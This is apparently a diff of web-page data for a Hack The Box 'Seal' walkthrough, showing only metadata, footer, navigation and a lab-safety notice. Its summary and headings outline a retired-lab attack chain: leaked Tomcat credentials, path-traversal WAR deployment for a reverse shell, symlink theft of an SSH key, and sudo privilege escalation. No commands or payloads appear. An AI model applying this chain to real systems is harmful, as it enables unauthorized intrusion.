-c:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L11",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
-12:T54f,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-seal-walkthrough/#article","headline":"Hack The Box: Seal Walkthrough","description":"GitBucket history exposes Tomcat credentials, a proxy path-normalization flaw permits WAR deployment, and an Ansible backup symlink steals a user's SSH key before sudo access to playbooks yields root.","url":"https://cyberkareem.com/writing/hackthebox-seal-walkthrough/","datePublished":"2026-06-11T16:06:37.000Z","dateModified":"2026-06-11T16:06:37.000Z","wordCount":2386,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSEP-Prep/blob/f7f46a4b549d12f28de2bee8b7a2e1e812f717e2/HTB-Seal.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-seal-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-seal-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Seal Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-seal-walkthrough/"}]}]}d:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$12"}}]
-e:["$","$L13",null,{"children":["$","$14",null,{"name":"Next.MetadataOutlet","children":"$@15"}]}]
-15:null
+<hr>b:["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","data-motion":"fade","children":[["$","$L10",null,{"headings":[{"id":"enumeration","label":"Enumeration"},{"id":"initial-reconnaissance","label":"Initial Reconnaissance"},{"id":"gitbucket-history","label":"GitBucket history"},{"id":"tomcat-manager-access-via-path-traversal","label":"Tomcat Manager Access via Path Traversal"},{"id":"foothold-war-reverse-shell","label":"Foothold - WAR Reverse Shell"},{"id":"lateral-movement-to-user-luis","label":"Lateral Movement to User (luis)"},{"id":"privilege-escalation-to-root","label":"Privilege Escalation to Root"},{"id":"flags","label":"Flags"},{"id":"lessons-learned","label":"Lessons learned"},{"id":"tools-used","label":"Tools Used"}]}],["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSEP-Prep/blob/f7f46a4b549d12f28de2bee8b7a2e1e812f717e2/HTB-Seal.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSEP-Prep",", commit f7f46a4b549d",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Seal, Linux, Medium",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/seal","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],[["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}],["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"4 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]]]}],["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$11"}}]]}]
+c:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-search-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Search Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T16:07:39.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-querier-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Querier Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T16:04:41.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
+d:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L12",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
+13:T54f,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-seal-walkthrough/#article","headline":"Hack The Box: Seal Walkthrough","description":"GitBucket history exposes Tomcat credentials, a proxy path-normalization flaw permits WAR deployment, and an Ansible backup symlink steals a user's SSH key before sudo access to playbooks yields root.","url":"https://cyberkareem.com/writing/hackthebox-seal-walkthrough/","datePublished":"2026-06-11T16:06:37.000Z","dateModified":"2026-06-11T16:06:37.000Z","wordCount":2386,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSEP-Prep/blob/f7f46a4b549d12f28de2bee8b7a2e1e812f717e2/HTB-Seal.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-seal-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-seal-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Seal Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-seal-walkthrough/"}]}]}e:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$13"}}]
+f:["$","$L14",null,{"children":["$","$15",null,{"name":"Next.MetadataOutlet","children":"$@16"}]}]
+16:null
